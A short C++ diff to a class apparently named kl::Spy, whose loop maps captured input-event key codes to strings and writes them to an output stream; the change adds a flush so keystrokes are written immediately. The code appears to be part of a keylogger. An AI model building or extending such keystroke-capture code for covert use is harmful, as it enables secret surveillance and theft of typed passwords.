@@ -36,7 +36,9 @@ void kl::Spy::start()
             lineLength += kl::keymap[evt[1].code].size();
             output << kl::keymap[evt[1].code] << (lineLength > 150 ? "\n" : "");
             lineLength = lineLength > 150 ? 0 : lineLength;
+            output.flush();
         }
     if (fd > -1)
         close(fd);
 }
+
